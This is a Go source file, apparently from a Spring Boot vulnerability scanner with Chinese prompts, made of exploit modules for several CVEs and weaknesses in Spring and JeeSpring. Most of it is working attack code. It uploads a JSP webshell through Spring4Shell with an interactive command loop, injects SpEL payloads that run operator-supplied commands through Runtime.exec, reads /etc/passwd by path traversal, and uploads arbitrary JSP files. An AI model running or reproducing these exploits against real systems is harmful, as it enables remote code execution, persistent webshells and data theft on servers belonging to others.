package vuln

import (
	"SpringBoot-Scan-go/pkg/common"
	"bufio"
	"encoding/base64"
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"

	"github.com/fatih/color"
)

var vulnNames = map[int]string{
	1: "JeeSpring_2023",
	2: "CVE_2022_22947",
	3: "CVE_2022_22963",
	4: "CVE_2022_22965",
	5: "CVE_2021_21234",
	6: "SnakeYAML_RCE",
	7: "Eureka_xstream_RCE",
	8: "JolokiaRCE",
	9: "CVE_2018_1273",
}

func VulnScan(baseURL string, proxy string, headers map[string]string) {
	color.Green("[+] 目前漏洞库内容如下：")
	for num, name := range vulnNames {
		fmt.Printf(" %d: %s\n", num, name)
	}

	fmt.Print("\n请输入要检测的漏洞 (例子：1,3,5 直接回车即检测全部漏洞): ")
	scanner := bufio.NewScanner(os.Stdin)
	scanner.Scan()
	choicesStr := scanner.Text()

	if choicesStr == "" {
		choicesStr = "1,2,3,4,5,6,7,8,9"
	}

	choices := parseChoices(choicesStr)
	if choices == nil {
		fmt.Println("请不要输入无意义的字符串")
		return
	}

	for _, choice := range choices {
		switch choice {
		case 1:
			JeeSpring2023(baseURL, proxy, headers, true)
		case 2:
			CVE202222947(baseURL, proxy, headers, true)
		case 3:
			CVE202222963(baseURL, proxy, headers, true)
		case 4:
			CVE202222965(baseURL, proxy, headers, true)
		case 5:
			CVE202121234(baseURL, proxy, headers, true)
		case 6:
			SnakeYAMLRCE(baseURL, proxy, headers, true)
		case 7:
			EurekaXstreamRCE(baseURL, proxy, headers, true)
		case 8:
			JolokiaRCE(baseURL, proxy, headers, true)
		case 9:
			CVE20181273(baseURL, proxy, headers, true)
		default:
			fmt.Printf("%d 输入错误，请重新输入漏洞选择模块\n", choice)
		}
	}
	color.Red("后续会加入更多漏洞利用模块，请师傅们敬请期待~")
}

func parseChoices(s string) []int {
	parts := strings.Split(s, ",")
	var result []int
	for _, p := range parts {
		n := 0
		_, err := fmt.Sscanf(strings.TrimSpace(p), "%d", &n)
		if err != nil {
			return nil
		}
		result = append(result, n)
	}
	return result
}

func doRequest(method, url string, headers map[string]string, body string, proxy string) (*http.Response, string) {
	client := common.NewHTTPClient(proxy)
	var req *http.Request
	var err error
	if body != "" {
		req, err = http.NewRequest(method, url, strings.NewReader(body))
	} else {
		req, err = http.NewRequest(method, url, nil)
	}
	if err != nil {
		return nil, ""
	}
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil, ""
	}
	respBody := common.ReadBody(resp)
	return resp, respBody
}

// CVE-2022-22965 (Spring4Shell)
func CVE202222965(url string, proxy string, headers map[string]string, interactive bool) {
	color.Green("======开始对目标URL进行CVE-2022-22965漏洞利用======")
	h1 := common.MergeHeaders(map[string]string{
		"User-Agent": common.RandomUA(),
		"prefix":     "<%",
		"suffix":     "%>//",
		"c":          "Runtime",
		"c1":         "Runtime",
		"c2":         "<%",
		"DNT":        "1",
	}, headers)
	h2 := common.MergeHeaders(map[string]string{
		"User-Agent":    common.RandomUA(),
		"Content-Type":  "application/x-www-form-urlencoded",
	}, headers)

	payloadLinux := `class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22bash%22,%22-c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=`
	payloadWin := `class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22tomcat%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(new String[]{%22cmd%22,%22/c%22,request.getParameter(%22cmd%22)}).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=`
	payloadOther := `class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=`
	payloadHTTP := `?class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bprefix%7Di%20java.io.InputStream%20in%20%3D%20%25%7Bc%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=`
	fileDateData := "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=_"
	getpayload := url + payloadHTTP

	doRequest("POST", url, h2, fileDateData, proxy)
	doRequest("POST", url, h2, payloadOther, proxy)
	doRequest("POST", url, h1, payloadLinux, proxy)
	time.Sleep(500 * time.Millisecond)
	doRequest("POST", url, h1, payloadWin, proxy)
	time.Sleep(500 * time.Millisecond)
	doRequest("GET", getpayload, h1, "", proxy)
	time.Sleep(500 * time.Millisecond)
	testResp, _ := doRequest("GET", url+"shell.jsp", h1, "", proxy)

	if testResp != nil && testResp.StatusCode == 200 {
		shellURL := url + "shell.jsp?pwd=tomcat&cmd=whoami"
		color.Red("[+] 存在编号为CVE-2022-22965的RCE漏洞，上传Webshell为：%s", shellURL)
		if interactive {
			for {
				fmt.Print("[+] 请输入要执行的命令>>> ")
				scanner := bufio.NewScanner(os.Stdin)
				scanner.Scan()
				cmd := scanner.Text()
				if cmd == "exit" {
					os.Exit(0)
				}
				cmdURL := fmt.Sprintf("%sshell.jsp?pwd=tomcat&cmd=%s", url, cmd)
				resp, body := doRequest("GET", cmdURL, h1, "", proxy)
				if resp != nil && resp.StatusCode == 500 {
					color.Yellow("[-] 重发包返回状态码500，请手动尝试利用WebShell：shell.jsp?pwd=tomcat&cmd=whoami\n")
					break
				}
				color.Green(body)
			}
		}
	} else {
		color.Yellow("[-] CVE-2022-22965漏洞不存在或者已经被利用,shell地址请手动尝试访问：\n[/shell.jsp?pwd=tomcat&cmd=命令] \n")
	}
}

// CVE-2022-22963
func CVE202222963(url string, proxy string, headers map[string]string, interactive bool) {
	color.Green("======开始对目标URL进行CVE-2022-22963漏洞利用======")
	h := common.MergeHeaders(map[string]string{
		"spring.cloud.function.routing-expression": `T(java.lang.Runtime).getRuntime().exec("whoami")`,
		"Accept-Encoding":  "gzip, deflate",
		"Accept":           "*/*",
		"Accept-Language":  "en",
		"User-Agent":       common.RandomUA(),
		"Content-Type":     "application/x-www-form-urlencoded",
	}, headers)

	testURL := url + "functionRouter"
	resp, body := doRequest("POST", testURL, h, "test", proxy)

	if resp != nil && resp.StatusCode == 500 && strings.Contains(body, `"error":"Internal Server Error"`) {
		color.Red("[+] 存在编号为CVE-2022-22963的RCE漏洞，请手动反弹Shell\n")
	} else {
		color.Yellow("[-] CVE-2022-22963漏洞不存在\n")
	}
}

// CVE-2022-22947
func CVE202222947(url string, proxy string, headers map[string]string, interactive bool) {
	color.Green("======开始对目标URL进行CVE-2022-22947漏洞利用======")
	h1 := common.MergeHeaders(map[string]string{
		"Accept-Encoding": "gzip, deflate",
		"Accept":          "*/*",
		"Accept-Language": "en",
		"User-Agent":      common.RandomUA(),
		"Content-Type":    "application/json",
	}, headers)
	h2 := common.MergeHeaders(map[string]string{
		"User-Agent":   common.RandomUA(),
		"Content-Type": "application/x-www-form-urlencoded",
	}, headers)

	payloadWindows := `{
  "id": "hacktest",
  "filters": [{
    "name": "AddResponseHeader",
    "args": {"name": "Result","value": "#{new java.lang.String(T(org.springframework.util.StreamUtils).copyToByteArray(T(java.lang.Runtime).getRuntime().exec(new String[]{\"dir\"}).getInputStream()))}"}
    }],
  "uri": "http://example.com",
  "order": 0
}`
	payloadLinux := strings.Replace(payloadWindows, "dir", "id", 1)

	vulnStatus := false

	color.Green("[+] 正在发送Linux的Payload")
	doRequest("POST", url+"actuator/gateway/routes/hacktest", h1, payloadLinux, proxy)
	doRequest("POST", url+"actuator/gateway/refresh", h2, "", proxy)
	resp3, body3 := doRequest("GET", url+"actuator/gateway/routes/hacktest", h2, "", proxy)

	if resp3 != nil && strings.Contains(body3, "uid=") && strings.Contains(body3, "gid=") && strings.Contains(body3, "groups=") {
		color.Red("[+] Payload已经输出，回显结果如下：")
		fmt.Println(body3)
		vulnStatus = true
		if interactive {
			fmt.Println("[+] 执行命令模块（输入exit退出）")
		}
	} else {
		color.Green("[.] Linux的Payload没成功，清理缓存")
		doRequest("DELETE", url+"actuator/gateway/routes/hacktest", h2, "", proxy)
		doRequest("POST", url+"actuator/gateway/refresh", h2, "", proxy)
		color.Green("[+] 正在发送Windows的Payload")
		doRequest("POST", url+"actuator/gateway/routes/hacktest", h1, payloadWindows, proxy)
		doRequest("POST", url+"actuator/gateway/refresh", h2, "", proxy)
		resp3, body3 = doRequest("GET", url+"actuator/gateway/routes/hacktest", h2, "", proxy)

		if resp3 != nil && strings.Contains(body3, "<DIR>") {
			color.Red("[+] Payload已经输出，回显结果如下：")
			fmt.Println(body3)
			vulnStatus = true
			if interactive {
				fmt.Println("[+] 执行命令模块（输入exit退出）")
			}
		}
	}

	if !vulnStatus {
		color.Yellow("[-] CVE-2022-22947漏洞不存在\n")
		doRequest("DELETE", url+"actuator/gateway/routes/hacktest", h2, "", proxy)
		doRequest("POST", url+"actuator/gateway/refresh", h2, "", proxy)
	}

	if vulnStatus && interactive {
		for {
			fmt.Print("[+] 请输入要执行的命令>>> ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			cmd := scanner.Text()
			if cmd == "exit" {
				doRequest("DELETE", url+"actuator/gateway/routes/hacktest", h2, "", proxy)
				doRequest("POST", url+"actuator/gateway/refresh", h2, "", proxy)
				fmt.Println("[+] 删除路由成功")
				os.Exit(0)
			}
			newPayload := strings.Replace(payloadWindows, "dir", cmd, 1)
			doRequest("POST", url+"actuator/gateway/routes/hacktest", h1, newPayload, proxy)
			doRequest("POST", url+"actuator/gateway/refresh", h2, "", proxy)
			_, resultBody := doRequest("GET", url+"actuator/gateway/routes/hacktest", h2, "", proxy)
			color.Green(resultBody)
			fmt.Println()
		}
	}
}

// JeeSpring 2023
func JeeSpring2023(url string, proxy string, headers map[string]string, interactive bool) {
	color.Green("======开始对目标URL进行2023JeeSpring任意文件上传漏洞利用======")
	h := common.MergeHeaders(map[string]string{
		"User-Agent":      common.RandomUA(),
		"Content-Type":    "multipart/form-data;boundary=----WebKitFormBoundarycdUKYcs7WlAxx9UL",
		"Accept-Encoding": "gzip, deflate",
		"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
		"Accept-Language": "zh-CN,zh;q=0.9,ja;q=0.8",
		"Connection":      "close",
	}, headers)

	payloadB64 := "LS0tLS0tV2ViS2l0Rm9ybUJvdW5kYXJ5Y2RVS1ljczdXbEF4eDlVTA0KQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJmaWxlIjsgZmlsZW5hbWU9ImxvZy5qc3AiDQpDb250ZW50LVR5cGU6IGFwcGxpY2F0aW9uL29jdGV0LXN0cmVhbQ0KDQo8JSBvdXQucHJpbnRsbigiSGVsbG8gV29ybGQiKTsgJT4NCi0tLS0tLVdlYktpdEZvcm1Cb3VuZGFyeWNkVUtZY3M3V2xBeHg5VUwtLQo="
	payload, _ := base64.StdEncoding.DecodeString(payloadB64)
	path := "static/uploadify/uploadFile.jsp?uploadPath=/static/uploadify/"

	resp, body := doRequest("POST", url+path, h, string(payload), proxy)

	if resp != nil && resp.StatusCode == 200 && strings.Contains(body, "jsp") {
		newPath := strings.TrimSpace(body)
		testURL := url + "static/uploadify/" + newPath
		respTest, bodyTest := doRequest("GET", testURL, h, "", proxy)
		if respTest != nil && respTest.StatusCode == 200 && strings.Contains(bodyTest, "Hello") {
			color.Red("[+] 存在2023JeeSpring任意文件上传漏洞，Poc地址如下：")
			color.Red(testURL + "\n")
		} else {
			color.Yellow("[.] 未发现Poc存活，请手动验证： %s", testURL)
		}
	} else {
		color.Yellow("[-] 2023JeeSpring任意文件上传漏洞不存在\n")
	}
}

// Jolokia RCE
func JolokiaRCE(url string, proxy string, headers map[string]string, interactive bool) {
	color.Green("======开始对目标URL进行Jolokia系列RCE漏洞测试======")
	h := common.MergeHeaders(map[string]string{"User-Agent": common.RandomUA()}, headers)

	resp1, _ := doRequest("POST", url+"jolokia", h, "", proxy)
	resp2, _ := doRequest("POST", url+"actuator/jolokia", h, "", proxy)

	code1, code2 := 0, 0
	if resp1 != nil {
		code1 = resp1.StatusCode
	}
	if resp2 != nil {
		code2 = resp2.StatusCode
	}

	if code1 == 200 || code2 == 200 {
		color.Red("[+] 发现jolokia相关路径状态码为200，进一步验证")
		respTest, bodyTest := doRequest("GET", url+"jolokia/list", h, "", proxy)
		if respTest != nil && respTest.StatusCode == 200 {
			if strings.Contains(bodyTest, "reloadByURL") {
				color.Red("[+] 存在Jolokia-Logback-JNDI-RCE漏洞，Poc地址如下：")
				color.Red(url+"jolokia/list\n")
			} else if strings.Contains(bodyTest, "createJNDIRealm") {
				color.Red("[+] 存在Jolokia-Realm-JNDI-RCE漏洞，Poc地址如下：")
				color.Red(url+"jolokia/list\n")
			} else {
				color.Yellow("[.] 未发现jolokia/list路径存在关键词，请手动验证：")
				color.Red(url + "jolokia/list\n")
			}
		}
	} else {
		color.Yellow("[-] Jolokia系列RCE漏洞不存在\n")
	}
}

// CVE-2021-21234
func CVE202121234(url string, proxy string, headers map[string]string, interactive bool) {
	color.Green("======开始对目标URL进行CVE-2021-21234漏洞测试======")
	h := common.MergeHeaders(map[string]string{"User-Agent": common.RandomUA()}, headers)

	payload1 := "manage/log/view?filename=/windows/win.ini&base=../../../../../../../../../../"
	payload2 := "log/view?filename=/windows/win.ini&base=../../../../../../../../../../"
	payload3 := "manage/log/view?filename=/etc/passwd&base=../../../../../../../../../../"
	payload4 := "log/view?filename=/etc/passwd&base=../../../../../../../../../../"

	_, body1 := doRequest("POST", url+payload1, h, "", proxy)
	_, body2 := doRequest("POST", url+payload2, h, "", proxy)
	_, body3 := doRequest("POST", url+payload3, h, "", proxy)
	_, body4 := doRequest("POST", url+payload4, h, "", proxy)

	if strings.Contains(body1, "MAPI") || strings.Contains(body2, "MAPI") {
		color.Red("[+] 发现Spring Boot目录遍历漏洞且系统为Win，Poc路径如下：")
		color.Red(url + payload1)
		color.Red(url + payload2 + "\n")
	} else if strings.Contains(body3, "root:x:") || strings.Contains(body4, "root:x:") {
		color.Red("[+] 发现Spring Boot目录遍历漏洞且系统为Linux，Poc路径如下：")
		color.Red(url + payload3)
		color.Red(url + payload4 + "\n")
	} else {
		color.Yellow("[-] 未发现Spring Boot目录遍历漏洞\n")
	}
}

// SnakeYAML RCE
func SnakeYAMLRCE(url string, proxy string, headers map[string]string, interactive bool) {
	color.Green("======开始对目标URL进行SnakeYAML RCE漏洞测试======")
	h1 := common.MergeHeaders(map[string]string{
		"User-Agent":   common.RandomUA(),
		"Content-Type": "application/x-www-form-urlencoded",
	}, headers)
	h2 := common.MergeHeaders(map[string]string{
		"User-Agent":   common.RandomUA(),
		"Content-Type": "application/json",
	}, headers)

	payload1 := "spring.cloud.bootstrap.location=http://127.0.0.1/example.yml"
	payload2 := `{"name":"spring.main.sources","value":"http://127.0.0.1/example.yml"}`
	testURL := url + "env"

	_, body1 := doRequest("POST", testURL, h1, payload1, proxy)
	_, body2 := doRequest("POST", testURL, h2, payload2, proxy)

	if strings.Contains(body1, "example.yml") {
		color.Red("[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 1.x：")
		color.Red("漏洞存在路径为 %s", testURL)
		color.Red("POST数据包内容为 %s\n", payload1)
	} else if strings.Contains(body2, "example.yml") {
		color.Red("[+] 发现SnakeYAML-RCE漏洞，Poc为Spring 2.x：")
		color.Red("漏洞存在路径为 %s", testURL)
		color.Red("POST数据包内容为 %s\n", payload2)
	} else {
		color.Yellow("[-] 未发现SnakeYAML-RCE漏洞\n")
	}
}

// Eureka Xstream RCE
func EurekaXstreamRCE(url string, proxy string, headers map[string]string, interactive bool) {
	color.Green("======开始对目标URL进行Eureka_Xstream反序列化漏洞测试======")
	h1 := common.MergeHeaders(map[string]string{
		"User-Agent":   common.RandomUA(),
		"Content-Type": "application/x-www-form-urlencoded",
	}, headers)
	h2 := common.MergeHeaders(map[string]string{
		"User-Agent":   common.RandomUA(),
		"Content-Type": "application/json",
	}, headers)

	payload1 := "eureka.client.serviceUrl.defaultZone=http://127.0.0.2/example.yml"
	payload2 := `{"name":"eureka.client.serviceUrl.defaultZone","value":"http://127.0.0.2/example.yml"}`

	testURL1 := url + "env"
	testURL2 := url + "actuator/env"

	_, body1 := doRequest("POST", testURL1, h1, payload1, proxy)
	_, body2 := doRequest("POST", testURL2, h2, payload2, proxy)

	if strings.Contains(body1, "127.0.0.2") {
		color.Red("[+] 发现Eureka_Xstream反序列化漏洞，Poc为Spring 1.x：")
		color.Red("漏洞存在路径为 %s", testURL1)
		color.Red("POST数据包内容为 %s\n", payload1)
	} else if strings.Contains(body2, "127.0.0.2") {
		color.Red("[+] 发现Eureka_Xstream反序列化漏洞，Poc为Spring 2.x：")
		color.Red("漏洞存在路径为 %s", testURL2)
		color.Red("POST数据包内容为 %s\n", payload2)
	} else {
		color.Yellow("[-] 未发现Eureka_Xstream反序列化漏洞\n")
	}
}

// CVE-2018-1273
func CVE20181273(url string, proxy string, headers map[string]string, interactive bool) {
	color.Green("======开始对目标URL进行Spring_Data_Commons远程命令执行漏洞测试======")
	h := common.MergeHeaders(map[string]string{
		"User-Agent":   common.RandomUA(),
		"Content-Type": "application/x-www-form-urlencoded",
	}, headers)

	testURL1 := url + "users"
	testURL2 := url + "users?page=0&size=5"
	payload1 := `username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("whoami")]=chybeta&password=chybeta&repeatedPassword=chybeta`
	payload2 := `username[#this.getClass().forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("java.lang.Runtime.getRuntime().exec('whoami')")]=asdf`

	resp1, body1 := doRequest("GET", testURL1, h, "", proxy)
	if resp1 != nil && resp1.StatusCode == 200 && strings.Contains(body1, "Users") {
		color.Red("[+] 发现Spring_Data_Commons远程命令执行漏洞：")
		color.Red("漏洞存在路径为 %s\n", testURL1)
		if interactive {
			fmt.Println("[+] 执行命令模块（输入exit退出）")
			fmt.Print("[+] 总共有两种Payload，请输入1或者2>>> ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan()
			choose := scanner.Text()
			for {
				fmt.Print("[+] 请输入要执行的命令>>> ")
				scanner.Scan()
				cmd := scanner.Text()
				if cmd == "exit" {
					os.Exit(0)
				}
				var payload string
				if choose == "1" {
					payload = strings.Replace(payload1, "whoami", cmd, 1)
				} else {
					payload = strings.Replace(payload2, "whoami", cmd, 1)
				}
				resp2, _ := doRequest("POST", testURL2, h, payload, proxy)
				if resp2 != nil && resp2.StatusCode != 503 {
					color.Red("[+] 该Payload已经打出，由于该漏洞无回显，请用Dnslog进行测试\n")
				}
			}
		}
	} else {
		color.Yellow("[-] 未发现Spring_Data_Commons远程命令执行漏洞\n")
	}
}
